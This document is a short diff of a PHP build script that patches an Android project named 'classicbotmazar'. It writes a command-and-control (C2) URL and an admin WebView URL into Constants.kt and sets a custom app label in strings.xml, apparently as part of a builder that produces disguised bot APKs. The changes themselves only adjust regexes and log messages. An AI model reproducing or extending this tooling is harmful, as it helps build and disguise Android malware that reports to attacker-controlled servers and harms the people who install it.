@@ -35,23 +35,20 @@ sendLog("Starting build process for $apkName ($appLabel)...");
 $constFile = $baseDir . '/app/src/main/java/org/reddeaddeath/classicbotmazar/Constants.kt';
 if (file_exists($constFile)) {
     $c = file_get_contents($constFile);
-    // Robust replacement for Kotlin var/val properties
-    $c = preg_replace('/(val|var)\s+urlConnection\s*=\s*".*?"/', '$1 urlConnection = "' . $c2Url . '"', $c);
-    $c = preg_replace('/(val|var)\s+urlAdmin\s*=\s*".*?"/', '$1 urlAdmin = "' . $webviewUrl . '"', $c);
+    // Explicit and very robust replacement
+    $c = preg_replace('/val\s+urlConnection\s*=\s*".*?"/', 'val urlConnection = "' . $c2Url . '"', $c);
+    $c = preg_replace('/val\s+urlAdmin\s*=\s*".*?"/', 'val urlAdmin = "' . $webviewUrl . '"', $c);
     file_put_contents($constFile, $c);
-    sendLog("Updated Constants.kt with C2 URL: $c2Url and WebView URL: $webviewUrl");
-} else {
-    sendLog("Warning: Constants.kt not found at $constFile");
+    sendLog("Patched Constants.kt - C2: $c2Url, Web: $webviewUrl");
 }
 
 // Update Strings
 $strFile = $baseDir . '/app/src/main/res/values/strings.xml';
 if (file_exists($strFile)) {
     $s = file_get_contents($strFile);
-    // Ensure we replace the app_name string correctly
     $s = preg_replace('/<string name="app_name">.*?<\/string>/', '<string name="app_name">' . htmlspecialchars($appLabel) . '</string>', $s);
     file_put_contents($strFile, $s);
-    sendLog("Updated strings.xml with App Label: $appLabel");
+    sendLog("Patched strings.xml - Name: $appLabel");
 }
 
 // JDK Detection
